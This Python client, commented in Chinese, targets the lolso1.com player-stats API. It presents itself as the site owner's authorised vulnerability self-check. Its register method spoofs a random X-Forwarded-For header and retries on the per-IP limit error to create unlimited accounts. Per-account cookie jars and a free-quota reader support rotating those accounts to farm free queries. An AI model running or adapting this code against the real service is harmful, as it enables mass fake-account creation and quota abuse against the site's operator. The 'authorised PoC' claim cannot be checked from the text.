# -*- coding: utf-8 -*-
"""
lolso1.com（搜联盟）站点客户端 —— 仅用于站长本人授权的漏洞自查 / 修复回归。
- API 独立部署在 https://r1.lolso1.com，Cookie 会话鉴权（credentials include）。
- 关键点（自查结论）：注册接口信任客户端传入的 X-Forwarded-For，导致“每 IP 限注册”可被
  随机伪造该请求头绕过；且注册无需邮箱/短信/人机验证。本客户端据此实现“无限起号”PoC，
  以便站长在修复前复现、修复后回归验证（修复后这里的伪造注册应当失败）。
- 每个账号一个独立 CookieJar 并落盘，便于轮换与离线保留登录态。
"""
import os
import json
import time
import random
import http.cookiejar
from urllib.request import Request, build_opener, HTTPCookieProcessor, ProxyHandler
from urllib.error import HTTPError, URLError

DEFAULT_BASE = "https://r1.lolso1.com"
ORIGIN = "https://lolso1.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
OK_CODE = "0000"


class LolError(RuntimeError):
    def __init__(self, message, err_code=None):
        super().__init__(message)
        self.err_code = err_code


def rand_forwarded_ip():
    """随机生成一个公网形态的 IPv4，用于伪造 X-Forwarded-For（仅注册绕过用）。"""
    while True:
        a = random.randint(11, 223)
        if a in (10, 100, 127, 169, 172, 192, 198, 203, 224):
            continue
        return f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


class LolClient:
    def __init__(self, cookie_file, base=DEFAULT_BASE, ua=UA, proxy=None, spoof_register=True):
        self.base = base.rstrip("/")
        self.cookie_file = cookie_file
        self.spoof_register = spoof_register
        self.cj = http.cookiejar.MozillaCookieJar(cookie_file)
        self._load()
        handlers = [HTTPCookieProcessor(self.cj)]
        if proxy:
            handlers.append(ProxyHandler({"http": proxy, "https": proxy}))
        self.opener = build_opener(*handlers)
        self.ua = ua

    def _load(self):
        try:
            self.cj.load(ignore_discard=True, ignore_expires=True)
        except Exception:
            pass

    def save_cookies(self):
        os.makedirs(os.path.dirname(self.cookie_file), exist_ok=True)
        self.cj.save(ignore_discard=True, ignore_expires=True)

    def _request(self, path, payload=None, method=None, extra_headers=None, timeout=30):
        url = self.base + path
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Origin": ORIGIN,
            "Referer": ORIGIN + "/",
            "User-Agent": self.ua,
        }
        if extra_headers:
            headers.update(extra_headers)
        data = None
        if payload is not None:
            data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
            headers["Content-Type"] = "application/json;charset=UTF-8"
            method = method or "POST"
        req = Request(url, data=data, headers=headers, method=method or ("POST" if payload is not None else "GET"))
        try:
            with self.opener.open(req, timeout=timeout) as r:
                raw = r.read().decode("utf-8", "replace")
        except HTTPError as e:
            raw = e.read().decode("utf-8", "replace")
        except URLError as e:
            raise LolError(f"网络错误：{e}")
        try:
            js = json.loads(raw)
        except Exception:
            raise LolError(f"非 JSON 响应：{raw[:200]}")
        code = str(js.get("errCode", ""))
        if code != OK_CODE:
            err = LolError(js.get("message") or f"接口返回 errCode={code}", code)
            err.raw = js
            raise err
        return js.get("data")

    # ---------- 账号 ----------
    def register(self, username, phone, email, password, max_ip_retry=8):
        """注册新号。默认每次都带随机 X-Forwarded-For；遇到 ERR_IP_LIMIT 换个伪造 IP 重试。"""
        body = {"username": username, "phone": str(phone), "email": email, "password": password}
        last = None
        for i in range(max_ip_retry):
            headers = {}
            if self.spoof_register:
                headers["X-Forwarded-For"] = rand_forwarded_ip()
            try:
                return self._request("/user/register", body, extra_headers=headers)
            except LolError as e:
                last = e
                if e.err_code == "ERR_IP_LIMIT" and self.spoof_register and i < max_ip_retry - 1:
                    time.sleep(0.4 * (i + 1))  # 换一个伪造 IP 再试
                    continue
                raise
        raise last

    def login(self, account, password):
        d = self._request("/user/login",
                          {"account": account, "password": password, "rememberMe": True})
        self.save_cookies()
        return d

    def me(self):
        return self._request("/user/me", None, method="GET")

    def is_logged_in(self):
        try:
            return bool(self.me())
        except Exception:
            return False

    def subscription(self):
        """返回 {total,used,remaining,resetAt}（free_daily_query 额度项），无则 None。"""
        data = self._request("/subscription/my", None, method="GET")
        for it in data or []:
            fq = it.get("freeQuota")
            if isinstance(fq, dict) and it.get("resourceCode") == "free_daily_query":
                return {"total": int(fq.get("totalQuantity") or 0),
                        "used": int(fq.get("usedQuantity") or 0),
                        "remaining": int(fq.get("remainingQuantity") or 0),
                        "resetAt": fq.get("resetAt")}
        return None

    # ---------- 查询 ----------
    def server_info(self, game_name, tag_line):
        return self._request("/league/player/server_info",
                             {"gameName": game_name, "tagLine": str(tag_line)})

    def overview(self, server_id, puuid):
        return self._request("/league/player/overview",
                             {"serverId": server_id, "puuid": puuid})

    def match_analysis(self, server_id, puuid, size=25, page=1, tag=-1):
        return self._request("/league/player/match_analysis",
                             {"serverId": server_id, "puuid": puuid,
                              "page": int(page), "size": int(size), "tag": int(tag)})
